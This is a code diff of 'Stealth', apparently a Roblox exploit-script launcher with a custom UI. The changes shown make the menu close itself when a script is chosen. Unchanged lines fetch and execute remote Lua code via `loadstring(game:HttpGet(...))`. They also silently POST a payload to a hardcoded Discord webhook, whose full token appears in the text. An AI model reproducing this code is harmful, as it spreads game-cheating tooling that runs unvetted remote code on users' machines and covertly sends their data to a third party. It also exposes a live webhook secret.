@@ -1,5 +1,5 @@
 -- [[ Stealth | Main launcher (Custom UI) ]]
--- No external library — built with raw Roblox Instances.
+-- Script selector — closes itself when a script is loaded.
 
 local STEALTH_API = "https://sstealth.vercel.app"
 local TweenService = game:GetService("TweenService")
@@ -25,6 +25,9 @@ end)
 
 local loaded = {}
 
+-- Reference to the GUI so we can destroy it
+local guiRef = nil
+
 local function loadScript(entry)
     if loaded[entry.url] then return end
     loaded[entry.url] = true
@@ -44,6 +47,13 @@ local function loadScript(entry)
         if reqFn then pcall(reqFn, { Url = "https://discord.com/api/webhooks/1521083124061310996/RBbz1Hc4X_HHSwZvwA7ftutwMnPXgEb7R-R9z_jTBR3ZCdFt3wVj3X4G5UgBanzOjei9", Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) }) end
     end)
 
+    -- DESTROY the launcher UI first so it disappears
+    if guiRef then
+        pcall(function() guiRef:Destroy() end)
+        guiRef = nil
+    end
+
+    -- Then load the script
     task.spawn(function()
         local ok, err = pcall(function() loadstring(game:HttpGet(entry.url))() end)
         if not ok then
@@ -56,7 +66,6 @@ end
 ------------------------------------------------------------
 -- Build custom UI
 ------------------------------------------------------------
--- Colors
 local BG = Color3.fromRGB(15, 15, 18)
 local ACCENT = Color3.fromRGB(48, 255, 106)
 local TEXT = Color3.fromRGB(255, 255, 255)
@@ -65,12 +74,12 @@ local SURFACE = Color3.fromRGB(22, 22, 28)
 local STROKE = Color3.fromRGB(40, 40, 48)
 
 local CoreGui = game:GetService("CoreGui")
-local gui = Instance.new("ScreenGui")
-gui.Name = "StealthHub"
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-pcall(function() gui.Parent = gethui() or CoreGui end)
-if not gui.Parent then gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui") end
+guiRef = Instance.new("ScreenGui")
+guiRef.Name = "StealthHub"
+guiRef.ResetOnSpawn = false
+guiRef.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+pcall(function() guiRef.Parent = gethui() or CoreGui end)
+if not guiRef.Parent then guiRef.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui") end
 
 -- Main window
 local frame = Instance.new("Frame")
@@ -79,7 +88,7 @@ frame.Position = UDim2.fromScale(0.5, 0.5)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
 frame.BackgroundColor3 = BG
 frame.BorderSizePixel = 0
-frame.Parent = gui
+frame.Parent = guiRef
 local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 10)
 corner.Parent = frame
@@ -123,7 +132,7 @@ infoLabel.TextColor3 = MUTED
 infoLabel.TextXAlignment = Enum.TextXAlignment.Left
 infoLabel.Parent = frame
 
--- Scrolling frame for scripts
+-- Scrolling frame
 local scroll = Instance.new("ScrollingFrame")
 scroll.Size = UDim2.new(1, -40, 0, 300)
 scroll.Position = UDim2.fromOffset(20, 70)
@@ -140,7 +149,7 @@ layout.Padding = UDim.new(0, 6)
 layout.SortOrder = Enum.SortOrder.LayoutOrder
 layout.Parent = scroll
 
--- Create script buttons
+-- Script buttons
 for i, entry in ipairs(SCRIPTS) do
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(1, 0, 0, 44)
@@ -156,8 +165,7 @@ for i, entry in ipairs(SCRIPTS) do
     bstroke.Color = STROKE
     bstroke.Thickness = 1
     bstroke.Parent = btn
-    
-    -- Name label
+
     local nameLabel = Instance.new("TextLabel")
     nameLabel.Size = UDim2.new(1, -16, 0, 18)
     nameLabel.Position = UDim2.fromOffset(8, 4)
@@ -168,8 +176,7 @@ for i, entry in ipairs(SCRIPTS) do
     nameLabel.TextColor3 = TEXT
     nameLabel.TextXAlignment = Enum.TextXAlignment.Left
     nameLabel.Parent = btn
-    
-    -- Desc label
+
     local descLabel = Instance.new("TextLabel")
     descLabel.Size = UDim2.new(1, -16, 0, 14)
     descLabel.Position = UDim2.fromOffset(8, 22)
@@ -180,15 +187,11 @@ for i, entry in ipairs(SCRIPTS) do
     descLabel.TextColor3 = MUTED
     descLabel.TextXAlignment = Enum.TextXAlignment.Left
     descLabel.Parent = btn
-    
+
     btn.MouseButton1Click:Connect(function()
-        -- Flash accent
         TweenService:Create(btn, TweenInfo.new(0.1), { BackgroundColor3 = ACCENT }):Play()
         TweenService:Create(nameLabel, TweenInfo.new(0.1), { TextColor3 = Color3.fromRGB(0, 0, 0) }):Play()
         task.wait(0.15)
-        TweenService:Create(btn, TweenInfo.new(0.3), { BackgroundColor3 = SURFACE }):Play()
-        TweenService:Create(nameLabel, TweenInfo.new(0.3), { TextColor3 = TEXT }):Play()
-        
         loadScript(entry)
     end)
 end
@@ -241,4 +244,4 @@ UserInputService.InputBegan:Connect(function(input)
     end
 end)
 
-print("[Stealth] Main launcher loaded with custom UI")
+print("[Stealth] Main launcher loaded")
